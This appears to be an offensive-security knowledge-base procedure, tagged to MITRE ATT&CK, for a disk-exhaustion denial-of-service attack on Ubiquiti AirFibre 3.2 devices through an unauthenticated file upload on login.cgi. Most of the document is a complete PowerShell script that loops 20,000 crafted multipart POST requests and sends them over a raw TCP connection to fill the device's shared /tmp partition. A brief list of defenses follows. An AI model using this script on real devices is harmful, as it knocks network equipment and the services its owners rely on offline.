---
id: proc-ubiquiti-dos-001
tags:
  - dos
  - disk-exhaustion
type: procedure
tools:
  - '[[tools/PowerShell]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/powershell-disk-exhaustion-script]]'
verified: false
platforms:
  - Embedded Linux
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:31:10.955Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[OS Exhaustion Flood]]'
---
# Repeat-Uploads-for-Disk-Exhaustion

## Summary

This procedure automates repeated unauthenticated file uploads of large files with unique names to the /tmp/upload directory on Ubiquiti AirFibre 3.2, exhausting the shared /tmp and /var partition to cause denial of service on device services.

## Description

By leveraging the unauthenticated upload vulnerability, this sends up to 20,000 files of 90KB each via PowerShell, filling the disk and disrupting services like radiod. The /tmp directory shares the root partition, making exhaustion impactful. This is suitable for resource-constrained embedded devices and can be detected via filesystem monitoring.

## Requirements

1. PowerShell environment for scripting
2. Network access to target on port 80
3. Target confirmed vulnerable via initial upload test

## Defense

Defensive measures and detection strategies:

- Enforce upload quotas and rate limiting on CGI endpoints
- Monitor disk usage alerts for /tmp and /var
- Log and block repeated POST requests from single sources

## Objectives

1. Flood /tmp with unique large files to exhaust space
2. Induce DoS on shared partitions
3. Observe service disruptions for impact validation

## Instructions

### Step 1: Prepare and Execute Upload Loop

**Context**: Use a PowerShell loop to generate unique filenames and send bulk uploads, utilizing a custom TCP function for raw HTTP transmission.

**Command** ([[commands/powershell-disk-exhaustion-script]]):

```powershell
$ip = "[target-ip]"
$content = "A" * 90000

for ($i=1; $i -le 20000; $i++)
{
$POST = "POST http://$ip/login.cgi HTTP/1.1\nProxy-Connection: keep-alive\nContent-Length: 5278\nCache-Control: max-age=0\nOrigin: http://$ip\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryoA1KFlNlMcwhR9SP\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer: http://$ip/login.cgi\nAccept-Language: en-US,en;q=0.8\nCookie: last_check=1485458998012; AIROS_SESSIONID=64e0483fab347136fb49fdf81e5542bc; ui_language=en_US\nHost: $ip\n\n------WebKitFormBoundaryoA1KFlNlMcwhR9SP\nContent-Disposition: form-data; name=\"file\"; filename=\"$i.txt\"\nContent-Type: text/plain\n\n$content\n------WebKitFormBoundaryoA1KFlNlMcwhR9SP\nContent-Disposition: form-data; name=\"action\"\n\nupload\n------WebKitFormBoundaryoA1KFlNlMcwhR9SP--\n"
echo $POST | Send-NetworkData -Computer [target-ip] -Port 80
}

function Send-NetworkData {
[CmdletBinding()]
param (
[Parameter(Mandatory)][string]
$Computer,

[Parameter(Mandatory)][ValidateRange(1, 65535)]
[Int16]
$Port,

[Parameter(ValueFromPipeline)]string[]
$Data,

[System.Text.Encoding]
$Encoding = [System.Text.Encoding]::ASCII,

[TimeSpan]
$Timeout = [System.Threading.Timeout]::InfiniteTimeSpan)

begin {
# establish the connection and a stream writer
$Client = New-Object -TypeName System.Net.Sockets.TcpClient
$Client.Connect($Computer, $Port)
$Stream = $Client.GetStream()
$Writer = New-Object -Type System.IO.StreamWriter -ArgumentList $Stream, $Encoding, $Client.SendBufferSize, $true
}
process {
# send all the input data
foreach ($Line in $Data) {
$Writer.WriteLine($Line)
}
}
end {
# flush and close the connection send
$Writer.Flush()
$Writer.Dispose()
$Client.Client.Shutdown('Send')
# read the response
$Stream.ReadTimeout = [System.Threading.Timeout]::Infinite
if ($Timeout -ne [System.Threading.Timeout]::InfiniteTimeSpan) {
$Stream.ReadTimeout = $Timeout.TotalMilliseconds
}

$Result = ''
$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize
do {
try {
$ByteCount = $Stream.Read($Buffer, 0, $Buffer.Length)
} catch [System.IO.IOException] {
$ByteCount = 0
}
if ($ByteCount -gt 0) {
$Result += $Encoding.GetString($Buffer, 0, $ByteCount)
}
} while ($Stream.DataAvailable -or $Client.Client.Connected)

Write-Output $Result
# cleanup
$Stream.Dispose()
$Client.Dispose()
}
}
```

> This script loops uploads with filenames like '1.txt' to '20000.txt', each containing 90KB of 'A's. Expected output includes successful responses initially, transitioning to errors as disk fills.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service
- [[OS Exhaustion Flood]] OS Exhaustion Floods

### Sub-Techniques


## Commands Used

- [[commands/powershell-disk-exhaustion-script]]

## Tools Used

- [[tools/PowerShell]]

## Tags

- dos
- disk-exhaustion
